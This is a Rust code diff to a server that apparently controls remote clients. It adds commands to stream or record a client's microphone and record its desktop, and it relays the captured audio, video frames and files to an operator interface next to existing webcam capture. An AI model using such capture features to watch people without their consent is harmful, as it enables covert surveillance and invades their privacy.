@@ -321,6 +321,41 @@ impl ServerWrapper {
                         .await;
                 }
 
+                RequestMicDevices(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::RequestMicDevices)
+                        .await
+                }
+
+                StartMicLive(addr, device_id) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StartMicLive(device_id))
+                        .await
+                }
+
+                StopMicLive(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StopMicLive)
+                        .await
+                }
+
+                StartMicRecording(addr, device_id) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StartMicRecording(device_id))
+                        .await
+                }
+
+                StopMicRecording(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StopMicRecording)
+                        .await
+                }
+
+                StartDesktopRecording(addr, config) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StartDesktopRecording(config))
+                        .await
+                }
+
+                StopDesktopRecording(addr) => {
+                    self.send_client_packet(&addr, ClientboundPacket::StopDesktopRecording)
+                        .await
+                }
+
                 RequestWebcam(addr) => {
                     self.handle_command(&addr, ClientboundPacket::RequestWebcam)
                         .await
@@ -472,7 +507,65 @@ impl ServerWrapper {
                         }),
                     ).await;
                 }
-                
+
+                MicAudioChunk(addr, chunk) => {
+                    self.emit_serde_payload(
+                        "mic_audio_chunk",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "timestamp": chunk.timestamp,
+                            "sampleRate": chunk.sample_rate,
+                            "channels": chunk.channels,
+                            "data": general_purpose::STANDARD.encode(&chunk.data),
+                        }),
+                    ).await;
+                }
+
+                MicRecordingFile(addr, file_data) => {
+                    self.emit_serde_payload(
+                        "mic_recording_file",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "name": file_data.name,
+                            "data": general_purpose::STANDARD.encode(&file_data.data),
+                        }),
+                    ).await;
+                }
+
+                DesktopRecordingPreviewFrame(addr, frame) => {
+                    self.emit_serde_payload(
+                        "desktop_recording_preview",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "timestamp": frame.timestamp,
+                            "display": frame.display,
+                            "width": frame.width,
+                            "height": frame.height,
+                            "data": general_purpose::STANDARD.encode(&frame.data),
+                        }),
+                    ).await;
+                }
+
+                DesktopRecordingFile(addr, file_data) => {
+                    self.emit_serde_payload(
+                        "desktop_recording_file",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "name": file_data.name,
+                            "data": general_purpose::STANDARD.encode(&file_data.data),
+                        }),
+                    ).await;
+                }
+
+                MicDeviceList(addr, devices) => {
+                    self.emit_serde_payload(
+                        "mic_device_list",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "devices": devices,
+                        }),
+                    ).await;
+                }
 
                 WebcamResult(addr, frame) => {
                     if let Ok(jpeg_data) = crate::utils::webcam::process_webcam_frame(frame) {
